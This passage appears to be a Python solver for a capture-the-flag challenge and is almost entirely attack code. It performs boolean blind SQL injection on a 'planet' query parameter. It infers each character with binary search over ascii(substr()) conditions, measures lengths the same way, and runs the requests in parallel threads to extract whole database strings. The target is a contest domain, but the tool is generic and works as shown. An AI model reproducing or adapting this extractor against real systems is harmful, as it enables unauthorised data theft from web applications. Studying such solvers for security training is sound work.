BASE="https://planetary.web.2026.sunshinectf.games/probe"
local=threading.local()
def sess():
    if not hasattr(local,"s"):
        local.s=requests.Session()
    return local.s
def q(cond):
    payload="mars' AND ("+cond+")-- -"
    for _ in range(4):
        try:
            r=sess().get(BASE, params={"planet":payload}, timeout=25)
            return "Signal detected" in r.text
        except Exception as e:
            pass
    return False

def bs(expr, i):
    lo,hi=0,127
    # ascii(substr(expr,i,1)) > mid
    while lo<hi:
        mid=(lo+hi)//2
        if q("ascii(substr((%s),%d,1))>%d"%(expr,i,mid)):
            lo=mid+1
        else:
            hi=mid
    return lo

def length_of(expr, maxlen=2000):
    lo,hi=0,maxlen
    while lo<hi:
        mid=(lo+hi)//2
        if q("length((%s))>%d"%(expr,mid)):
            lo=mid+1
        else:
            hi=mid
    return lo

def extract(expr, maxlen=2000, workers=30):
    n=length_of(expr, maxlen)
    sys.stderr.write("len=%d\n"%n)
    res=[None]*(n+1)
    with cf.ThreadPoolExecutor(max_workers=workers) as ex:
        futs={ex.submit(bs, expr, i): i for i in range(1,n+1)}
        for f in cf.as_completed(futs):
            i=futs[f]
            res[i]=f.result()
    return "".join(chr(c) for c in res[1:])

